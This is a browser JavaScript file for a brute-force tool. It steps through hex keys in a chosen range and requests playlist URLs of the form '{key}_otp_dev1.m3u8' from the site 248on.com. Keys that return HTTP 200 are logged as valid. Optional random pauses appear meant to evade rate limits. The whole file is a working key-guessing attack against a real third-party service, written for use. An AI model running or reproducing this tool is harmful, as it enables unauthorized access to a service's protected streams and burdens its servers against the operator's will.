let fromInt = null;
let toInt = null;
let pause = 1; //pause
let randomPause = true; //randomPauseCb

let logArea = null;
let goodArea = null;

let bruteTimer = null;
let currentKey = null;

let properKeys = [];

async function main(){
	fromInt = document.getElementById("fromInt");
	toInt = document.getElementById("toInt");
	initLogs();

	const [from, to] = restoreRangeFromStorage();
	pause = restorePauseFromStorage();
	randomPause = restoreRandomPauseFromStorage();

	fromInt.value = from;
	toInt.value = to;

	fromInt.onchange = rangeValueChanged.bind(window, fromInt, 'from')
	toInt.onchange = rangeValueChanged.bind(window, toInt, 'to')

	document.getElementById("pause").addEventListener('input', pauseValueChanged);
	document.getElementById("pause").value = pause;
	pauseValueChanged();

	document.getElementById("randomPauseCb").addEventListener('input', randomPauseValueChanged);
	document.getElementById("randomPauseCb").checked = randomPause;
	randomPauseValueChanged();

	properKeys = restoreProperKeysFromStorage();
	renderProperKeys();

}

function rangeValueChanged(target, suffix){
	localStorage.setItem(`248on_${suffix}_key`, target.value);
}

function restoreRangeFromStorage(){
	let [from, to] = [0, 0xffffffff];
	let tmp = null;

	tmp = localStorage.getItem("248on_from_key");
	if (tmp)
		from = Number(tmp)
	tmp = localStorage.getItem("248on_to_key");
	if (tmp)
		to = Number(tmp);

	return [from, to];
}

function restorePauseFromStorage(){
	tmp = localStorage.getItem("248on_pause");
	if (tmp)
		return Number(tmp);
	return 10;
}

function restoreRandomPauseFromStorage(){
	tmp = localStorage.getItem("248on_random_pause");
	if (tmp)
		return tmp == 'true';
	return false;
}

function restoreProperKeysFromStorage(){
	tmp = localStorage.getItem("248on_proper_keys");
	try{
		if (tmp)
			return JSON.parse(tmp);
	}catch(e){
		return [];
	}
	return [];
}

async function check248onStatus(key){
	log("check " + key)
	return await fetch(`http://248on.com/playlist/${key}_otp_dev1.m3u8`,  { method: 'GET', redirect: 'follow' })
	.then((response) => {
		return response.status;
	})
}

function toKey(number){
	return number.toString(16).padStart(6, '0');
}

function startBrute(){
	if (bruteTimer === null){
		initLogs();
		log("start...\n");
		bruteTimer = setTimeout(doBruteCheck, 0);
	}
}

function stopBrute(){
	clearTimeout(bruteTimer);
	bruteTimer = null;
	currentKey = null;
	log("\nstop\n");
}

function getCurrentPause(){
	return randomPause ? ( Math.ceil(Math.random() * pause * 1000) ) : pause * 1000;
}

function doBruteCheck(){
	const rebrute = (p = 0) => {
		return bruteTimer && (bruteTimer = setTimeout(doBruteCheck, p));
	};

	if (currentKey === null)
		currentKey = Number(fromInt.value);
	else
		++currentKey;

	if (currentKey > Number(toInt.value)){
		log("normal finish\n");
		stopBrute();
	}else{
		check248onStatus(toKey(currentKey))
		.then(code => {
			switch(code){
				case 200:
					//alert("!The key is " + toKey(currentKey))
					log(" OK!\n");
					goodArea.value += toKey(currentKey) + "\n";
					addProperKey(toKey(currentKey));
				break;
				case 403:
					log(" fail\n");
					rebrute(getCurrentPause());
				break;
			}
		})
		.catch( e => {
			log(e.toString());
			log();
			log("unexpected finish\n");
			stopBrute();
		})
	}
}

function pauseValueChanged(event){
	//console.log(event.target.value);
	if (event){
		pause = Number(event.target.value);
		document.getElementById("pauseText").innerHTML = "Пауза (" + pause + " сек)";
		localStorage.setItem(`248on_pause`, pause.toString());
	}else
		document.getElementById("pauseText").innerHTML = "Пауза (" + pause + " сек)";
}


function randomPauseValueChanged(event){
	if (event){
		randomPause = event.target.checked;
		localStorage.setItem(`248on_random_pause`, randomPause.toString());
	}
}

function initLogs(){
	logArea = document.getElementById("logArea");
	logArea.value = "";

	goodArea = document.getElementById("goodArea");
	goodArea.value = "";
}

function log(string = "\n"){
	logArea.value += string
	//logArea.scrollIntoView({block: "end", inline: "nearest"});
	logArea.scrollIntoView(false);
}

function addProperKey(key){
	properKeys.push(key);
	localStorage.setItem("248on_proper_keys", JSON.stringify(properKeys));
	renderProperKeys();
}

function renderProperKeys(){
	goodArea.value = properKeys.join("\n");
}

function clearProperKeys(){
	localStorage.setItem("248on_proper_keys", "[]");
	properKeys = [];
	renderProperKeys();
}

window.onload=main;
